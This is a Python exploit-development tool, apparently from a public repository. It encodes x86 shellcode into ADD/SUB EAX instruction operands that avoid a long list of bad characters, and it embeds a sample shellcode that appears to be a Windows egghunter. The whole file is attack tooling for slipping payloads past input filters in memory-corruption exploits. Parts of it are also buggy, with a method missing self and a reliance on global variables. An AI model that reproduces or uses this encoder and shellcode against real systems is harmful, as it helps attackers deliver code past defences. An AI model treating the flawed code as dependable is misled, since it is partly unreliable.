#!/usr/bin/python3

# ASE86 - An ADD/SUB Encoder for x86 shellcode
# By Michael W. Norris
# https://github.com/norrismw/exploit-dev/blob/master/ASEncoder86/ASE86.py

import argparse, struct, sys, random


class AddSubEncoder86: # subtract = True in the following example

    def __init__(self, bad_chars, shellcode): # initializes local variables
        self.bad_chars = bad_chars # bad bytes/characters
        self.shellcode = shellcode # shellcode to be encoded
        self.values = [v for v in range(256)] # all byte values
        self.all_bytes = b''.join([bytes([b]) for b in self.values]) # string of all bytes
        self.allowed_chars = [b for b in self.all_bytes if b not in self.bad_chars] # allowed bytes/characters

    def zero_register():
        while True:
            two_bytes = random.sample(self.allowed_chars, k=2)
            if two_bytes[0] & two_bytes[1] == 0:
                return two_bytes

    def chunk_shellcode(self): # divides shellcode into 4 byte chunks, padding with NOP (\x90) bytes if necessary
        if not len(self.shellcode) % 4 == 0: # if the length of the shellcode isn't evenly divisible by 4
            for i in range(4 - ((len(shellcode) % 4))): # determines how many NOP bytes to add ...
                self.shellcode.append(144) #  e.g. if len(shellcode) is 31, then 4 - (31 % 4) = 1, so 1 NOP byte \x90 (144) will be appended to the shellcode
        return [self.shellcode[i:i+4] for i in range(0, len(self.shellcode), 4)] # divides shellcode into 4 byte chunks; e.g. if len(shellcode) is 8, [bytearray(b'\xe7\xff\xe7u'), bytearray(b'\xaf\xeau\xaf')]

    def target_value(self, four_bytes): # subtract = True; \xe7\xff\xe7\x75
        operand = [b for b in four_bytes] # \xe7\xff\xe7\x75 -> [231, 255, 231, 117]
        if subtract: # if subtract = True, use SUB EAX byte math instead of ADD EAX byte math
            input_one = 4294967294 # base 10 integer value of \xff\xff\xff\xfe
            input_two = struct.unpack('>I', bytearray(operand))[0] # base 10 integer value of bl; \xe7\xff\xe7\x75 -> 3892307829
            operand = [b for b in (input_one ^ input_two).to_bytes(4, 'big')] # \xff\xff\xff\xfe) XOR \xe7\xff\xe7\x75 = \x18\x00\x18\x8b -> [24, 0, 24, 139]
        return operand # returns operand list based on 'subtract' boolean; e.g. [231, 255, 231, 117] if subtract = False or [24, 0, 24, 139] if subtract = True

    def check_carry(self, four_bytes, t): # subtract = True; \x18\x00\x18\x8b = [24, 0, 24, 139]; subtract 1 (0x01) from the left when adding to/beyond 256 (0x0100)
        reverse = four_bytes[::-1] # reverses [24, 0, 24, 139] to [139, 24, 0, 24]; consider bytes in this order to account for cascading arithmetic
        for i in range(t): # accounts for [139, 24, 0] (no position to the left of the most significant '24' byte, so ignore)
            if reverse[i] < min(self.allowed_chars) * t: # if true, must add to/beyond 256 (0x0100) to reach byte value; True for '0' (must add to 256) at index 2
                    reverse[i+1] -= 1 # subtracts 1 (0x01) from '24' at index 3 ([139, 24, 0, 23]) to account for the 0x0100 carry
        return reverse[::-1] # revert to original byte order [23, 0, 24, 139]

    def brute_addition(self, n, t): # finds three allowed bytes/character values that add to a bad byte/character value
        if n < min(self.allowed_chars) * t: # can't add three numbers to n when n is less than three times the lowest value allowed character ...
            n += 256 # so add three numbers to n + 256; n + 256 = 0x010n, so normalize for carry
        if t == 2:
            all_pairs = [element for element in ((x,y) for x in self.allowed_chars for y in self.allowed_chars)]
            for pair in all_pairs: # considers all combinations
                if sum(pair) == n: # check if the two allowed bytes add to n;
                    return pair # return pair; e.g. n = 24, could return (10, 14)
        elif t == 3:
            while True: # never give up. never surrender.
                selected_bytes = random.choices(self.allowed_chars, k=3) # pick three bytes from allowed characters; allows for duplicate bytes to be selected
                if sum(selected_bytes) == n: # check if the three random allowed bytes add to n;
                    return selected_bytes # return selected_bytes; e.g. n = 24, could return [9, 6, 9]

    def dword2int(self, dword): # converts byte values/lists such as [12, 91, 19, 86] to  207295318
        dword_int = struct.unpack('>I', bytearray(dword))[0] # if binary = False, format bytes for 'ADD EAX,04640106' or 'SUB EAX,04640106' style assembly instructions
        if binary: # if binary = True
            dword_int = struct.unpack('<I', bytearray(dword))[0] # format bytes for '05 06016404` or '2d 06016404' style binary edit/paste instructions
        return dword_int

    def four_hex(self, value): # converts integer to a 4 byte zero-padded hexadecimal number
        return '%0*x' % (8, value)


if __name__ == '__main__': # subtract = False in the following example
    subtract = False # True for SUB, False for ADD
    binary = False # formatted for 'ADD EAX,04640106' or 'SUB EAX,04640106' style assembly instructions

    bad_chars = bytearray(b'\x00\x0a\x0d\x2f\x3a\x3f\x40\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff')
    shellcode = bytearray(b'\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7')

    encoder = AddSubEncoder86(bad_chars, shellcode)

    forward_chunks = encoder.chunk_shellcode() # breaks shellcode into chunks of 4; first 4 bytes are at index 0
    code_chunks = [chunk[::-1] for chunk in forward_chunks[::-1]] # e.g. forward_chunks[-1] is code_chunks[0], and forward_chunks[-1][-1] is code_chunks[0][0]
    raw_targets = [encoder.target_value(chunk) for chunk in code_chunks] # list of four byte target values generated by AddSubEncoder86.target_value()

    two_targets = [encoder.check_carry(raw_targets[i], 2) for i in range(len(raw_targets))] # list of four two-value tuples that each add to target value, adjusted to account for adding to/beyond 256 (0x0100)
    three_targets = [encoder.check_carry(raw_targets[i], 3) for i in range(len(raw_targets))] # list of four three-value lists that each add to target value, adjusted to account for adding to/beyond 256 (0x0100)

    for loop_num in range(len(code_chunks)): # iterates over each chunk of 4 byte shellcode; e.g. \xe7\xff\xe7\x75
        two_operands = [encoder.brute_addition(two_targets[loop_num][i], 2) for i in range(4)] # attempts to add all possible pairs of allowed byte values to reach target byte values
        three_operands = [encoder.brute_addition(three_targets[loop_num][i], 3) for i in range(4)] # attempts to add three random allowed byte values to reach target byte values
        operands = three_operands if None in two_operands else two_operands # if all byte targets can be rached with two operands, then None will not be in list of tuples
        print('Three') if None in two_operands else print('Two')

        bytevalues = list()
        for index in range(len(operands[0])):
            bytevalues.append([operands[b][index] for b in range(4)]) # byte value of an ADD operand; e.g. [15, 72, 104, 108]

        intvalues = [encoder.dword2int(bytevalue) for bytevalue in bytevalues] # e.g. [256403564, 1263303845, 458431280]
        for index in range(len(intvalues)):
            print('%s' % (encoder.four_hex(intvalues[index]))) # e.g. ADD EAX,0f48686c#ADD EAX,4b4c7ca5#ADD EAX,1b531b30
